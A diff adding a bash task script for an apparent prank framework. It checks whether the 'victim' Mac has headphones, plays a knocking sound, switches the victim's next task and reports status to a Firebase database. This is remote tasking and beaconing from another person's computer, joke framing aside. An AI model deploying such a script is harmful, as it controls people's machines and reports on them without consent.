@@ -1,0 +1,63 @@
+#!/usr/bin/env bash
+# REST API
+# https://firebase.google.com/docs/reference/rest/database/
+
+# Get the location of this script.
+SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+# Define the task ID
+thisTaskID="binaural_knock"
+
+# Get some default functions and variables from the deployment
+source "$SCRIPTDIR/deploy"
+
+###############################################################################
+
+# Get the program parameters.
+
+victim="$1"
+rootIteration="$2"
+
+###############################################################################
+
+# Your own code
+
+# Always write data to this tasks location.
+#e.g.
+audio_location="$SCRIPTDIR/binaural_knock.mp3"
+
+if [ ! -e "$audio_location" ]; then
+  curl "https://github.com/thiesgehrmann/arduinoPranks/blob/master/websiteReactionPrank/binaural_knock.mp3" > "$audio_location"
+fi
+
+# Determine if the victim had headphones plugged in
+function has_headphones() {
+  if [ ! -z "`system_profiler SPAudioDataType | grep 'Output Source' | grep 'Headphones'`" ]; then
+    echo "0"
+  else
+    echo "1"
+  fi
+}
+
+date=`date`
+played="No"
+headphones="No"
+
+# If the victim is wearing headphones, then
+if [ `has_headphones` -eq 0 ]; then
+  afplay "$audio_location"
+  played="Yes"
+  headphones="Yes"
+  # Revert to the previous task, whatever that was.
+  setVictimTask "$victim" "_previous_task_"
+fi
+
+#Relay status to server
+curl -X PUT -d "{\"played\" : \"$played\", \"date\" : \"$date\", \"headphones\" : \"$headphones\" }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+
+###############################################################################
+
+#Finally, you should sleep as well. Try not to use the computer's resources too much,
+# It is only a prank, after all.
+
+sleep `getIterationLength`
